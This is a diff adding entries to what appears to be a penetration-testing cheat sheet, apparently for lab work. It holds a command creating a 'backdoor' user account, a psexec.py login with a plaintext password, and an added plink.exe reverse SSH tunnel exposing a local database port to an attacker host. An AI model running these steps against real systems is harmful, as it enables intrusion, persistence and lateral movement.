@@ -24,6 +24,8 @@ xfreerdp --plugin rdpsnd --plugin rdpdr --data disk:home:/home -- -u cfsnspk03 1
 
 xfreerdp /u:cfsnspk03 /v:10.129.3.4 /cert-ignore
 
+xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
+
 ### Add user
 `net user backdoor backdoor123 /add`
 
@@ -38,4 +40,9 @@ xfreerdp /u:cfsnspk03 /v:10.129.3.4 /cert-ignore
 
 python /usr/share/doc/python3-impacket/examples/psexec.py alice:ThisIsTheUsersPassword01@10.11.1.20
 
+### adding yes answer to plink.exe command
+cmd.exe /c echo y | C:\Tools\port_redirection_and_tunneling\plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
 
+##### Powershell
+
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser
